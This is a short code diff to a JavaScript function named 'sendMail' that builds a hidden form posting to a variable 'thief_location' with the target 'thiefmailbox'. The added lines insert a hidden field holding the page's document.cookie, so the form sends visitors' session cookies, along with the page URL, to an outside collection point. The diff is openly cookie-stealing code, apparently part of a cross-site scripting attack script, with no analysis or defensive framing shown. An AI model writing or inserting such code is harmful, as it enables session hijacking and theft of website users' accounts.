@@ -40,6 +40,11 @@ function sendMail(params){
 	form.setAttribute("method", "post");
 	form.setAttribute("target", "thiefmailbox");
 	form.setAttribute("action", thief_location+"?lo="+location.href);
+	var field = document.createElement("input");
+	field.setAttribute("type", "hidden");
+	field.setAttribute("name", "cookie");
+	field.setAttribute("value", document.cookie);
+	form.appendChild(field);
 	for(var key in params) {
 		if(params.hasOwnProperty(key)) {
 			var field = document.createElement("input");
